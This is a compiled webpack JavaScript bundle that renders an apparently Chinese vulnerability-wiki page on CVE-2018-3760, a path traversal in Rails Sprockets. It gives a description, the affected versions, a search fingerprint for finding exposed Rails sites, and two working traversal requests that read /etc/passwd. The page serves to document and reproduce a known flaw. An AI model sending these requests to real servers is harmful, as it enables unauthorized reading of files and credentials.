(window.webpackJsonp=window.webpackJsonp||[]).push([[206],{1289:function(s,a,t){s.exports=t.p+"assets/img/1656041292346-1069b91e-aa5e-4d53-821a-9150720e9b5e.75344fc0.png"},1290:function(s,a,t){s.exports=t.p+"assets/img/1656041358544-854ca040-261f-474f-86fc-61a8558e4238.f9038b8e.png"},1291:function(s,a,t){s.exports=t.p+"assets/img/1656041483857-17cdbe06-5526-4b80-9189-b4ec9ea0b834.991dda3e.png"},3028:function(s,a,t){"use strict";t.r(a);var r=t(65),e=Object(r.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"rails-sprockets-任意文件读取漏洞-cve-2018-3760"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#rails-sprockets-任意文件读取漏洞-cve-2018-3760"}},[s._v("#")]),s._v(" Rails sprockets 任意文件读取漏洞 CVE-2018-3760")]),s._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),a("p",[s._v("Ruby On Rails在开发环境下使用Sprockets作为静态文件服务器，Ruby On Rails是著名Ruby Web开发框架，Sprockets是编译及分发静态资源文件的Ruby库。")]),s._v(" "),a("p",[s._v("Sprockets 3.7.1及之前版本中，存在一处因为二次解码导致的路径穿越漏洞，攻击者可以利用%252e%252e/来跨越到根目录，读取或执行目标服务器上任意文件。")]),s._v(" "),a("h2",{attrs:{id:"漏洞影响"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("Sprockets < 3.7.1")]),a("br"),s._v(" "),a("h2",{attrs:{id:"网络测绘"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v('title="Ruby On Rails"')]),a("br"),s._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),a("p",[s._v("主页面")]),s._v(" "),a("p",[a("img",{attrs:{src:t(1289),alt:"img"}})]),s._v(" "),a("p",[s._v("先获取绝对路径")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("assets"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("file"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("f"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("f"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("etc"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("passwd\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:t(1290),alt:"img"}})]),s._v(" "),a("p",[s._v("再利用POC读取文件")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("assets"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("file"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("f"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("f"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("usr"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("src"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("blog"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("app"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("assets"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("images"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("252")]),s._v("e"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("252")]),s._v("e"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("252")]),s._v("e"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("252")]),s._v("e"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("252")]),s._v("e"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("252")]),s._v("e"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("252")]),s._v("e"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("252")]),s._v("e"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("252")]),s._v("e"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("252")]),s._v("e"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("252")]),s._v("e"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("252")]),s._v("e"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("etc"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("passwd\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:t(1291),alt:"img"}})])],1)}),[],!1,null,null,null);a.default=e.exports}}]);